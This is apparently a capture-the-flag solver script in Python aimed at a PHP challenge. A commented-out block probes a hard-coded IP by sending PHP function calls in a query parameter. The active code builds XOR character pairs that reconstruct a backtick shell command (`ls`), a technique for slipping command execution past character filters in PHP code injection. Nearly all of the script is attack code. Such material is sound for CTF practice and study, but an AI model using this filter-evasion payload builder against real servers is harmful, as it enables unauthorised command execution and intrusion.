# RazviOverflow
# Python3

'''
import requests

url = "http://192.46.227.32/"
functions = ["get_called_class","get_parent_class","get_included_files","get_required_files","get_class_vars","get_object_vars","get_class_methods","get_declared_classes","get_declared_traits","get_declared_interfaces","get_defined_functions","get_defined_vars","get_resource_type","get_resources","get_loaded_extensions","get_extension_funcs","get_defined_constants","getdate","get_html_translation_table","getimagesize","getimagesizefromstring","getrandmax","getservbyname","getservbyport","getprotobyname","getprotobynumber","getmyuid","getmygid","getmypid","getmyinode","getlastmod","getenv","getopt","gettimeofday","getrusage","get_current_user","get_cfg_var","get_magic_quotes_gpc","get_magic_quotes_runtime","get_include_path","gethostbyaddr","gethostbyname","gethostbynamel","gethostname","getmxrr","gettype","get_meta_tags","get_headers","get_browser","getcwd","getallheaders","gettext","get_lucky_number","get_lucky_word"]

for function in functions:
    print("[+] Requesting " + function)
    print(requests.get(url, params={'roll' : function}).text)
    print("[+] Requesting " + function + " as array")
    print(requests.get(url, params={'roll' : "var_dump(" + function + "())"}).text)



def get_xor_strings(expected, valids):
  word1 = ""
  word2 = ""
 
  for i in expected:
    for valid in valids:
      result = chr(ord(i) ^ ord(valid))
      if result in valids:
        word1 = word1 + result
        word2 = word2 + valid
        break
  return word1, word2
'''

import string

def xor(str1, str2):
    result = []
    for i, j in zip(str1, str2):
        result.append(chr(ord(i) ^ ord(j)))
    return ''.join(result)

def get_xor_strings(expected, valids):
  word1 = ""
  word2 = ""
 
  for i in expected:
    for valid in valids:
      result = chr(ord(i) ^ ord(valid))
      if result in valids:
        word1 = word1 + result
        word2 = word2 + valid
        break
  return word1, word2

valids = [ ]
for item in string.ascii_letters:
    valids.append(item)

valids.append("(")
valids.append(")")
valids.append("_")
valids.append(".")

valids = valids[:len(valids)]
print("[+] Generated valids => {}".format(valids))
 
expected = "`ls`"
word1, word2 = get_xor_strings(expected, valids)
print("[+] Word 1 {}- Word2 {}".format(word1, word2))
 
result = xor(word1, word2)
print("[+] Verifying... Should be {} => {}".format(expected, result))